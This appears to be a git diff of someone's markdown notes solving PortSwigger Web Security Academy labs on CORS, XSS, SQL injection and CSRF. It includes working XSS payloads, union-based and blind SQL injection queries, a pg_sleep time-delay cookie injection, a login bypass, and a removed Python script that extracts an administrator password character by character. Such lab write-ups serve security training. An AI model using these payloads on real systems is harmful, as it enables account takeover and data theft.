@@ -1,4 +1,4 @@
-# Portswigger Labs
+# Portswigger - Web Security Academy (Solutions)
 
 > Upsolve the actual solutions as well.
 
@@ -107,13 +107,10 @@ Login as wiener/peter and send the request.
 2. Go to /my-account
 3. /my-account?id=admin is blocked
 
-
 ```http
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
 Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S
-
-
 Access-Control-Allow-Origin: https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net
 Access-Control-Allow-Credentials: true
 ```
@@ -178,7 +175,6 @@ function reqListener() {
 
 ```TBD```
 
-
 ## XSS
 #### Reflected XSS into HTML context with nothing encoded
 
@@ -216,8 +212,8 @@ location = 'https://ac511fab1f3d1c45803b260200ad008e.web-security-academy.net/?s
 </script>
 ```
 
-#### Reflected XSS with event handlers and href attributes blocked
-I first checked all the tags that are allowed using this [script](rxss-blocked-href-event.py).
+#### Reflected XSS with event handlers and href attributes blocked ⭐
+I first checked all the tags that are allowed using this [script](xss/rxss-blocked-href-event.py).
 
 ```
 a
@@ -233,10 +229,8 @@ Then after modifying a payload from [here](https://brutelogic.com.br/blog/xss-wi
 
 Intended solution (which didn't work for me for some reason): `<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>`
 
-
 #### Stored XSS into HTML context with nothing encoded
 Comment `<img src=x onerror=alert(1)>`
-
 
 #### DOM XSS in document.write sink using source location.search
 The sink and source are in embedded javascript within the search page.
@@ -278,7 +272,7 @@ for(var i=0;i<stores.length;i++) {
 document.write('</select>');
 ```
 
-- We see that ```storeId``` is acting as a sink.
+- We see that `storeId` is acting as a sink.
 - As soon as we add it to the query, we get it as an option in select.
 - We will have to close option and select tags and then inject our alert payload.
 
@@ -396,20 +390,32 @@ XSS in [innerText](https://stackoverflow.com/questions/52707031/does-innertext-p
 - `/filter?category='+union+select+null,column\_name+from+all\_tab\_columns+where+table\_name='USERS\_QCHNKE'`
 - `/filter?category='+union+select+USERNAME\_NREBWP,PASSWORD\_TKLBZQ+from+USERS\_QCHNKE--`
 
-
 #### Blind SQL injection with conditional responses
-```python
-for j in range(1,50):
-    for i in string.printable:
-        payload = "' UNION SELECT password FROM users WHERE username='administrator' \
-                        AND SUBSTRING(password,1,"+str(j)+")='"+(k+i)+"'--"
-        cookies = {'TrackingId':'xyz' + payload}
-        r = requests.get(url, cookies=cookies)
-        if 'Welcome back!' in r.text:
-            k += i
-            print(k)
-            break
-```
+Wrote a [script](sqli/sqli-blind-boolean-response.py) to compare substring and check reponse text.
+
+#### Blind SQL injection with conditional errors ⭐
+Similar script as conditional responses over [here](sqli/sqli-blind-boolean-error.py).
+
+#### Blind SQL injection with time delays ⭐
+Doesn't work:
+- `Cookie: TrackingId=' or pg_sleep(10)--;`
+- `Cookie: TrackingId=' union select pg_sleep(10)--;`
+
+Intended solution:
+`Cookie: TrackingId=' || pg_sleep(10)--;`
+
+#### Blind SQL injection with time delays and information retrieval
+Take a look at [this](sqli/sqli-bind-time.py) script.
+
+#### Blind SQL injection with out-of-band interaction
+
+```TBD```
+
+#### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+`/filter?category=' or 1=1--`
+
+#### SQL injection vulnerability allowing login bypass
+Entered this in the username field `administrator'--`
 
 ## CSRF
 #### CSRF vulnerability with no defenses
